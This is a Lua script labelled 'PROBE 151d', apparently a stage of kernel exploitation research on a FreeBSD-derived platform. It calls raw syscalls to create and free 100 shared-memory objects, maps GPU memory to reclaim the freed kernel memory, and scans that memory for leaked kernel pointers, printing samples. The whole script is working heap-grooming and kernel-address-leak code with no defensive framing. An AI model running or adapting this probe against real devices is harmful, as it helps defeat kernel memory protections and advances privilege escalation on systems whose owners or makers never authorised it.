-- CRASH_CLASS: LOW
-- PROBE 151d: Minimal SHM create/destroy with heap scan
--
-- Ultra-safe: only use proven syscalls (454, 477, 593)

print("=== PROBE 151d: SHM MINIMAL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("pid=" .. to_num(syscall.getpid()))

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

print("S1")

-- Step 1: GPU mmap baseline - scan for pre-existing kernel pointers
local gpu1 = sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g1h, g1l = get_hi_lo(gpu1)
print(string.format("gpu1=0x%X%08X", g1h, g1l))

local kptr_before = 0
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_before = kptr_before + 1
        end
    end
end
print("kptr_before=" .. kptr_before)

print("S2")

-- Step 2: Create 100 SHM objects
for i = 1, 100 do
    local k = memory.alloc(0x20)
    memory.write_qword(k, uint64(0xAA000000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(k)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
end
print("created 100 SHM")

print("S3")

-- Step 3: Destroy them all (free kernel objects)
for i = 1, 100 do
    local k = memory.alloc(0x20)
    memory.write_qword(k, uint64(0xAA000000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(k)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end
print("destroyed 100 SHM")

print("S4")

-- Step 4: New GPU mmap to try to reclaim freed memory
local gpu2 = sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g2h, g2l = get_hi_lo(gpu2)
print(string.format("gpu2=0x%X%08X", g2h, g2l))

local kptr_after = 0
local kptr_samples = {}
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu2 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_after = kptr_after + 1
            if #kptr_samples < 20 then
                kptr_samples[#kptr_samples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("kptr_after=" .. kptr_after)
for _, s in ipairs(kptr_samples) do print(s) end

print("S5")

-- Step 5: Check if the SHM allocator uses the same slab as GPU mmap
-- Try different approach: allocate SHM, write marker to GPU, check after destroy
-- This tests if SHM and GPU share heap

-- Also scan gpu1 again to see if SHM operations contaminated it
local kptr_gpu1_rescan = 0
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_gpu1_rescan = kptr_gpu1_rescan + 1
            if kptr_gpu1_rescan <= 5 then
                print(string.format("GPU1_RESCAN +0x%X: 0x%08X%08X", off, vh, vl))
            end
        end
    end
end
print("kptr_gpu1_rescan=" .. kptr_gpu1_rescan)

-- Canary
print("canary=" .. to_num(syscall.getpid()))

print("=== PROBE 151d COMPLETE ===")
